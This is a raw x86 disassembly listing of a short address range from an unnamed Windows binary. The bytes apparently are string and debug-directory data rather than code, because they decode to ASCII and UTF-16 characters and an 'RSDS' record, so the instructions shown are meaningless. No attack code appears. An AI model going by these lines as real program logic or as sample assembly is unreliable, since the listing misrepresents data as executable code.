  4347d0:	push   ebx
  4347d1:	xor    DWORD PTR [eax],edi
  4347d3:	pop    edi
  4347d4:	push   ecx
  4347d5:	xor    BYTE PTR [edx+0x5f],cl
  4347d8:	inc    ecx
  4347d9:	add    BYTE PTR ss:[edx+0x45],al
  4347dd:	push   edi
  4347de:	cmp    DWORD PTR [eax],edi
  4347e0:	pop    edi
  4347e1:	inc    edx
  4347e2:	xor    eax,0x36520057
  4347e7:	aaa    
  4347e8:	xor    BYTE PTR [edi],dh
  4347ea:	pop    edi
  4347eb:	inc    edx
  4347ec:	cmp    DWORD PTR [edi+0x52],eax
  4347ef:	dec    esp
  4347f0:	pop    edi
  4347f1:	dec    ebx
  4347f2:	add    BYTE PTR [esp+edx*2+0x30],al
  4347f6:	pop    edi
  4347f7:	push   ebp
  4347f8:	push   ebx
  4347f9:	aaa    
  4347fa:	dec    ebp
  4347fb:	pop    edi
  4347fc:	xor    ecx,DWORD PTR [edx+0x4e]
  4347ff:	dec    ebx
  434800:	dec    edx
  434801:	add    BYTE PTR [edi+0x47],al
  434804:	xor    eax,0x534e5f32
  434809:	push   esp
  43480a:	pop    edi
  43480b:	push   esp
  43480c:	inc    edx
  43480d:	inc    esi
  43480e:	inc    esp
  43480f:	add    BYTE PTR [ebp+0x4e],al
  434812:	inc    edi
  434813:	cmp    DWORD PTR [edi+0x57],ebx
  434816:	push   eax
  434817:	push   ecx
  434818:	pop    edi
  434819:	dec    edi
  43481a:	inc    ebx
  43481b:	push   edi
  43481c:	pop    edi
  43481d:	inc    edi
  43481e:	add    BYTE PTR [edi+0x45],dl
  434821:	inc    esi
  434822:	pop    edi
  434823:	push   edx
  434824:	inc    edx
  434825:	pop    eax
  434826:	inc    edi
  434827:	ss pop edi
  434829:	push   esi
  43482a:	inc    ebx
  43482b:	dec    esi
  43482c:	inc    esp
  43482d:	add    BYTE PTR [edi+0x4d],cl
  434830:	inc    edi
  434831:	xor    ebx,DWORD PTR [edi+0x34]
  434834:	dec    esi
  434835:	pop    edx
  434836:	cmp    BYTE PTR [edi+0x58],bl
  434839:	cmp    BYTE PTR [eax],al
  43483b:	push   edx
  43483c:	pop    eax
  43483d:	push   ecx
  43483e:	pop    edi
  43483f:	dec    esp
  434840:	push   edx
  434841:	dec    ecx
  434842:	dec    edi
  434843:	inc    esp
  434844:	pop    edi
  434845:	dec    edi
  434846:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  43484a:	push   eax
  43484b:	inc    ebp
  43484c:	pop    edi
  43484d:	xor    eax,0x565f3945
  434852:	add    BYTE PTR [edi+0x4e],al
  434855:	push   esi
  434856:	pop    edi
  434857:	inc    edi
  434858:	push   esp
  434859:	dec    eax
  43485a:	xor    dh,BYTE PTR [ecx]
  43485c:	pop    edi
  43485d:	dec    edi
  43485e:	xor    eax,DWORD PTR ss:[eax]
  434861:	inc    esp
  434862:	inc    ebp
  434863:	dec    ecx
  434864:	pop    edi
  434865:	push   edx
  434866:	dec    eax
  434867:	xor    al,0x48
  434869:	dec    ecx
  43486a:	ss pop edi
  43486c:	aaa    
  43486d:	aaa    
  43486e:	dec    ecx
  43486f:	dec    ebp
  434870:	add    BYTE PTR [eax+0x54],cl
  434873:	ss pop edi
  434875:	inc    esi
  434876:	inc    edx
  434877:	xor    dh,BYTE PTR [eax+eax*1]
  43487a:	dec    esi
  43487b:	ss dec edx
  43487d:	pop    edi
  43487e:	dec    ecx
  43487f:	dec    esp
  434880:	inc    edi
  434881:	inc    esp
  434882:	dec    eax
  434883:	xor    BYTE PTR [eax],bh
  434885:	xor    eax,0x34004f00
  43488a:	add    BYTE PTR [eax+eax*1+0x33],cl
  43488e:	add    BYTE PTR [edi],dh
  434890:	add    BYTE PTR [eax],dh
  434892:	add    BYTE PTR [edi+0x0],bl
  434895:	inc    esp
  434896:	add    BYTE PTR [edi+0x0],al
  434899:	dec    ebx
  43489a:	add    BYTE PTR [edx],dh
  43489c:	add    BYTE PTR [ecx+0x0],al
  43489f:	inc    ebx
  4348a0:	add    BYTE PTR [eax],al
  4348a2:	add    BYTE PTR [edi+0x0],cl
  4348a5:	xor    al,BYTE PTR [eax]
  4348a7:	xor    eax,DWORD PTR [eax]
  4348a9:	pop    edi
  4348aa:	add    BYTE PTR [edi+0x0],dl
  4348ad:	xor    al,BYTE PTR [eax]
  4348af:	dec    edi
  4348b0:	add    BYTE PTR [edi+0x0],bl
  4348b3:	pop    edx
  4348b4:	add    BYTE PTR [eax],al
  4348b6:	add    BYTE PTR [eax+0x0],bl
  4348b9:	dec    esp
  4348ba:	add    BYTE PTR [ecx],bh
  4348bc:	add    BYTE PTR [edi+0x0],bl
  4348bf:	dec    ebx
  4348c0:	add    BYTE PTR [ecx+0x0],al
  4348c3:	dec    edx
  4348c4:	add    BYTE PTR [esi+0x0],al
  4348c7:	xor    DWORD PTR [eax],eax
  4348c9:	xor    al,0x0
  4348cb:	pop    edi
  4348cc:	add    BYTE PTR [eax+0x0],bl
  4348cf:	inc    edi
  4348d0:	add    BYTE PTR [edx+0x0],al
  4348d3:	add    BYTE PTR [eax],al
  4348d5:	push   eax
  4348d6:	add    BYTE PTR [ebx],dh
  4348d8:	add    BYTE PTR [esi+0x0],cl
  4348db:	pop    edi
  4348dc:	add    BYTE PTR [eax+0x0],cl
  4348df:	xor    eax,0x5f005300
  4348e4:	add    BYTE PTR [eax+0x0],cl
  4348e7:	add    BYTE PTR [eax],al
  4348e9:	dec    ebp
  4348ea:	add    BYTE PTR [eax],dh
  4348ec:	add    BYTE PTR [edx+0x0],al
  4348ef:	pop    edi
  4348f0:	add    BYTE PTR [edx+0x0],cl
  4348f3:	pop    eax
  4348f4:	add    BYTE PTR [eax+eax*1+0x49],dl
  4348f8:	add    BYTE PTR [eax+eax*1+0x39],cl
  4348fc:	add    BYTE PTR [eax+eax*1+0x0],cl
  434900:	add    BYTE PTR [ecx+0x0],al
  434903:	xor    eax,DWORD PTR [eax]
  434905:	xor    BYTE PTR [eax],al
  434907:	pop    edi
  434908:	add    BYTE PTR [ecx+0x0],al
  43490b:	pop    edx
  43490c:	add    BYTE PTR [ecx+0x0],dl
  43490f:	pop    edx
  434910:	add    BYTE PTR [ecx],bh
  434912:	add    BYTE PTR [esi],dh
  434914:	add    BYTE PTR [edi+0x0],bl
  434917:	dec    eax
  434918:	add    BYTE PTR [eax+eax*1+0x5a],cl
  43491c:	add    BYTE PTR [eax],al
  43491e:	add    BYTE PTR [ecx+0x0],dl
  434921:	push   edi
  434922:	add    BYTE PTR [ecx+0x0],bl
  434925:	pop    edi
  434926:	add    BYTE PTR [esi+0x0],dl
  434929:	xor    al,0x0
  43492b:	inc    esp
  43492c:	add    BYTE PTR [ecx],dh
  43492e:	add    BYTE PTR [eax],bh
  434930:	add    BYTE PTR [edx],dh
  434932:	add    BYTE PTR [edi+0x0],bl
  434935:	cmp    DWORD PTR [eax],eax
  434937:	push   esp
  434938:	add    BYTE PTR [eax+eax*1+0x0],dl
  43493c:	add    BYTE PTR [esi+0x0],dl
  43493f:	dec    edi
  434940:	add    BYTE PTR [edi+0x0],al
  434943:	add    BYTE PTR ss:[edi+0x0],bl
  434947:	dec    edi
  434948:	add    BYTE PTR [edx+0x0],bl
  43494b:	inc    ebp
  43494c:	add    BYTE PTR [eax],dh
  43494e:	add    BYTE PTR [ebp+0x0],al
  434951:	xor    BYTE PTR [eax],al
  434953:	pop    edi
  434954:	add    BYTE PTR [eax],dh
  434956:	add    BYTE PTR ds:0x4f000000,dh
  43495c:	add    BYTE PTR ds:0x5f005700,dh
  434962:	add    BYTE PTR [edi],dh
  434964:	add    BYTE PTR [ebx+0x0],dl
  434967:	push   ebp
  434968:	add    BYTE PTR [edi+0x0],al
  43496b:	xor    al,0x0
  43496d:	pop    edi
  43496e:	add    BYTE PTR [ecx+0x0],dl
  434971:	inc    esp
  434972:	add    BYTE PTR [eax],al
  434974:	add    BYTE PTR [edx+0x0],dl
  434977:	push   esp
  434978:	add    BYTE PTR ds:0x52005f00,dh
  43497e:	add    BYTE PTR [edi+0x0],dl
  434981:	xor    al,BYTE PTR [eax]
  434983:	xor    al,BYTE PTR [eax]
  434985:	xor    BYTE PTR [eax],al
  434987:	xor    BYTE PTR [eax],al
  434989:	pop    edi
  43498a:	add    BYTE PTR [esi],dh
  43498c:	add    BYTE PTR [eax],al
  43498e:	add    BYTE PTR [eax+0x0],cl
  434991:	inc    ebp
  434992:	add    BYTE PTR [eax+eax*1+0x30],cl
  434996:	add    BYTE PTR [edi+0x0],bl
  434999:	dec    edx
  43499a:	add    BYTE PTR [edx],dh
  43499c:	add    BYTE PTR [edi],dh
  43499e:	add    BYTE PTR [ebp+0x0],dl
  4349a1:	add    BYTE PTR ss:[eax],dh
  4349a4:	add    BYTE PTR [eax],al
  4349a6:	add    BYTE PTR [esi+0x0],dl
  4349a9:	cmp    BYTE PTR [eax],al
  4349ab:	dec    edi
  4349ac:	add    BYTE PTR [ecx],bh
  4349ae:	add    BYTE PTR [edi+0x0],bl
  4349b1:	pop    eax
  4349b2:	add    BYTE PTR [edx+0x0],bl
  4349b5:	dec    esp
  4349b6:	add    BYTE PTR [ebx+0x0],cl
  4349b9:	add    BYTE PTR [eax],al
  4349bb:	dec    ecx
  4349bc:	add    BYTE PTR [ebp+0x0],dl
  4349bf:	dec    edi
  4349c0:	add    BYTE PTR [eax],al
  4349c2:	add    BYTE PTR [edx+0x53],dl
  4349c5:	inc    esp
  4349c6:	push   ebx
  4349c7:	in     eax,dx
  4349c8:	dec    ecx
  4349c9:	shl    BYTE PTR [esi+0x483f6cef],1
  4349cf:	mov    eax,0xc3ee09f2
  4349d4:	sbb    BYTE PTR [ebx+0x54],bl
  4349d7:	sbb    al,BYTE PTR [eax]
  4349d9:	add    BYTE PTR [eax],al
  4349db:	push   ebx
  4349dc:	cmp    bl,BYTE PTR [ecx+eiz*2+0x76]
  4349e0:	jne    0x434a5b
  4349e2:	ins    DWORD PTR es:[edi],dx
  4349e3:	dec    ecx
  4349e4:	jb     0x434a60
  4349e6:	pop    esp
  4349e7:	bound  di,DWORD PTR [edx+0x52]
  4349eb:	gs fs push ax
  4349ef:	arpl   WORD PTR [esi+0x5c],si
  4349f2:	js     0x434a4e
  4349f4:	je     0x434a3d
  4349f6:	jno    0x434a3a
  4349f8:	jno    0x434a61
  4349fa:	bound  ebp,QWORD PTR [esi]
  4349fc:	jo     0x434a62
  4349fe:	bound  eax,QWORD PTR [eax]
